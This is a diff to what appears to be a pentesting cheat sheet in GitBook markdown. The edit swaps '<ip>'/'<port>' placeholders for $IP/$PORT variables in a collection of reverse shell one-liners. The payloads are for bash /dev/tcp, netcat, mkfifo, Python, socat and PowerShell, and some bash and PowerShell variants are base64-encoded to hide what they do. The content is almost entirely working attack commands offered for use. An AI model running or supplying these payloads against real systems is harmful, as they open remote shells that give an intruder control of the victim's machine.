@@ -29,7 +29,7 @@ layout:
 {% tab title="Bash" %}
 {% code overflow="wrap" %}
 ```bash
-bash -i >& /dev/tcp/<ip>/<port> 0>&1
+bash -i >& /dev/tcp/$IP/$PORT 0>&1
 ```
 {% endcode %}
 
@@ -45,7 +45,7 @@ Generate the payload:
 
 {% code overflow="wrap" %}
 ```bash
-echo "bash -i >& /dev/tcp/<ip>/<port> 0>&1" | base64 | base64 | xargs -I{} echo "echo {}|base64 -d|base64 -d|bash"
+echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1" | base64 | base64 | xargs -I{} echo "echo {}|base64 -d|base64 -d|bash"
 ```
 {% endcode %}
 {% endtab %}
@@ -54,27 +54,27 @@ echo "bash -i >& /dev/tcp/<ip>/<port> 0>&1" | base64 | base64 | xargs -I{} echo 
 ### Netcat
 
 ```bash
-nc -e /bin/bash <ip> <port>
+nc -e /bin/bash $IP $PORT
 ```
 
 ### Mkfifo
 
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
 ```
 
 ### Python
 
 {% code overflow="wrap" %}
 ```bash
-i="<ip>" p=<port> && echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$i',$p));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('bash')" | python
+echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('bash')" | python
 ```
 {% endcode %}
 
 ### Socat
 
 ```bash
-socat tcp-connect:<ip>:<port> exec:/bin/bash,pty,stderr,setsid,sigint,sane
+socat tcp-connect:$IP:$PORT exec:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
 
 ### PowerShell
@@ -85,7 +85,7 @@ Generate the payload:
 
 {% code overflow="wrap" %}
 ```bash
-echo '$client = New-Object System.Net.Sockets.TCPClient("<ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t utf-16le | base64 -w 0 | xargs echo "powershell -e"
+echo '$client = New-Object System.Net.Sockets.TCPClient("$IP",$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t utf-16le | base64 -w 0 | xargs echo "powershell -e"
 ```
 {% endcode %}
 {% endtab %}
